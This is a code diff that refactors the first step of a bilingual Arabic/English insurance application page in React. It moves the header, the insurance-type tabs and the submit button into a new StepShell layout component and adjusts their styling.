@@ -6,7 +6,7 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Globe, RefreshCw, Loader2 } from 'lucide-react'
 import { FullPageLoader } from "@/components/loader"
-import { StepIndicator } from "@/components/step-indicator"
+import { StepShell } from "@/components/step-shell"
 import { getOrCreateVisitorID, initializeVisitorTracking, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
@@ -291,56 +291,49 @@ export default function HomePage() {
   }
   
   return (
-    <div className="min-h-screen bg-gradient-to-br from-[#0a4a68] via-[#0d5a7d] to-[#083d57]">
-      {/* Header */}
-      <div className="px-4 py-4 md:px-6 md:py-5 flex items-center justify-between">
+    <StepShell
+      step={1}
+      title={language === "ar" ? "بيانات الوثيقة" : "Policy details"}
+      subtitle={language === "ar" ? "أدخل بياناتك الأساسية لبدء الطلب." : "Enter your details to start."}
+      maxWidthClassName="max-w-3xl"
+      headerAction={
         <button 
           onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
-          className="flex items-center gap-2 px-4 py-2.5 md:px-5 md:py-3 bg-white rounded-xl hover:bg-gray-50 transition-all duration-300 shadow-lg hover:shadow-xl hover:-translate-y-0.5"
+          className="flex items-center gap-2 rounded-lg border border-[#d8e2ec] bg-[#f6f9fc] px-3 py-2 text-sm font-bold text-[#145072]"
         >
-          <Globe className="w-5 h-5 md:w-6 md:h-6 text-[#0a4a68]" />
-          <span className="text-[#0a4a68] font-bold text-sm md:text-base">{language === "ar" ? "EN" : "AR"}</span>
+          <Globe className="h-4 w-4 text-[#145072]" />
+          <span>{language === "ar" ? "EN" : "AR"}</span>
         </button>
-        <div className="w-12 h-12 md:w-14 md:h-14 rounded-full bg-gradient-to-br from-white/20 to-white/10 border-2 border-white/50 flex items-center justify-center shadow-xl backdrop-blur-sm">
-          <span className="text-white text-2xl md:text-3xl font-bold drop-shadow-md">B</span>
+      }
+    >
+      <div className="overflow-hidden rounded-2xl border border-[#dbe6ef] bg-white shadow-sm animate-fade-in-up">
+        {/* Tabs */}
+        <div className="grid grid-cols-4 text-center bg-gray-50" dir={language === "ar" ? "rtl" : "ltr"}>
+          {[
+            { ar: "مركبات", en: "Vehicles", key: "vehicles" },
+            { ar: "طبي", en: "Medical", key: "medical" },
+            { ar: "أخطاء طبية", en: "Medical Errors", key: "medicalErrors" },
+            { ar: "سفر", en: "Travel", key: "travel" }
+          ].map((tab) => (
+            <button
+              key={tab.key}
+              onClick={() => setActiveTab(tab.ar)}
+              className={`py-4 md:py-5 font-bold text-sm md:text-base lg:text-lg transition-all duration-300 relative ${
+                activeTab === tab.ar
+                  ? "text-[#0a4a68] bg-gradient-to-r from-amber-400 to-yellow-400 shadow-lg"
+                  : "text-gray-500 hover:text-[#0a4a68] hover:bg-white"
+              }`}
+            >
+              {language === "ar" ? tab.ar : tab.en}
+              {activeTab === tab.ar && (
+                <div className="absolute bottom-0 left-0 right-0 h-1 bg-[#0a4a68]" />
+              )}
+            </button>
+          ))}
         </div>
-      </div>
 
-      {/* Step Indicator */}
-      <div className="px-3 py-6 md:px-6 md:py-10 text-center">
-        <StepIndicator currentStep={1} />
-      </div>
-
-      {/* Main Content */}
-      <div className="max-w-3xl mx-auto -mt-2 md:-mt-4 px-3 md:px-4 pb-8 md:pb-12">
-        <div className="bg-white rounded-2xl md:rounded-3xl shadow-2xl overflow-hidden animate-fade-in-up">
-          {/* Tabs */}
-          <div className="grid grid-cols-4 text-center bg-gray-50" dir={language === "ar" ? "rtl" : "ltr"}>
-            {[
-              { ar: "مركبات", en: "Vehicles", key: "vehicles" },
-              { ar: "طبي", en: "Medical", key: "medical" },
-              { ar: "أخطاء طبية", en: "Medical Errors", key: "medicalErrors" },
-              { ar: "سفر", en: "Travel", key: "travel" }
-            ].map((tab) => (
-              <button
-                key={tab.key}
-                onClick={() => setActiveTab(tab.ar)}
-                className={`py-4 md:py-5 font-bold text-sm md:text-base lg:text-lg transition-all duration-300 relative ${
-                  activeTab === tab.ar
-                    ? "text-[#0a4a68] bg-gradient-to-r from-amber-400 to-yellow-400 shadow-lg"
-                    : "text-gray-500 hover:text-[#0a4a68] hover:bg-white"
-                }`}
-              >
-                {language === "ar" ? tab.ar : tab.en}
-                {activeTab === tab.ar && (
-                  <div className="absolute bottom-0 left-0 right-0 h-1 bg-[#0a4a68]" />
-                )}
-              </button>
-            ))}
-          </div>
-
-          {/* Form */}
-          <form onSubmit={handleFirstStepSubmit} className="p-5 md:p-8 lg:p-10 space-y-4 md:space-y-5" dir={language === "ar" ? "rtl" : "ltr"}>
+        {/* Form */}
+        <form onSubmit={handleFirstStepSubmit} className="p-5 md:p-8 lg:p-10 space-y-4 md:space-y-5" dir={language === "ar" ? "rtl" : "ltr"}>
             {/* Insurance Type Buttons */}
             <div className="grid grid-cols-2 gap-3 md:gap-4">
               <button
@@ -584,16 +577,15 @@ export default function HomePage() {
               )}
             </div>
 
-            {/* Submit Button */}
-            <Button
-              type="submit"
-              className="w-full h-12 md:h-14 bg-[#0a4a68] hover:bg-[#083d57] text-white font-bold text-lg md:text-xl rounded-lg md:rounded-xl shadow-lg hover:shadow-xl transition-all"
-            >
-              {translations[language].next}
-            </Button>
-          </form>
-        </div>
+          {/* Submit Button */}
+          <Button
+            type="submit"
+            className="w-full h-12 md:h-14 bg-[#0a4a68] hover:bg-[#083d57] text-white font-bold text-lg md:text-xl rounded-lg md:rounded-xl shadow-lg hover:shadow-xl transition-all"
+          >
+            {translations[language].next}
+          </Button>
+        </form>
       </div>
-    </div>
+    </StepShell>
   )
 }
